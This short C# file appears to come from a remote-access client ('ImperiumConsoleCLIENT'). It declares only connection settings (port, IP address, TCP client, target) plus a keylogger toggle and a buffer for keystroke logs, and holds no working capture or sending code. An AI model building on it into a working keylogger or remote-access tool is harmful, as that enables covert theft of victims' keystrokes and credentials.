using System.Net;
using System.Net.Sockets;

namespace ImperiumConsoleCLIENT
{
    public static class Variables
    {
        public static int Port;
        public static IPAddress IPAddress = null;
        public static TcpClient TCPClient;
        public static string ConnectTo;
        public static bool EnableKeylogger;
        public static System.Text.StringBuilder KeystrokeLogs;
    }
}
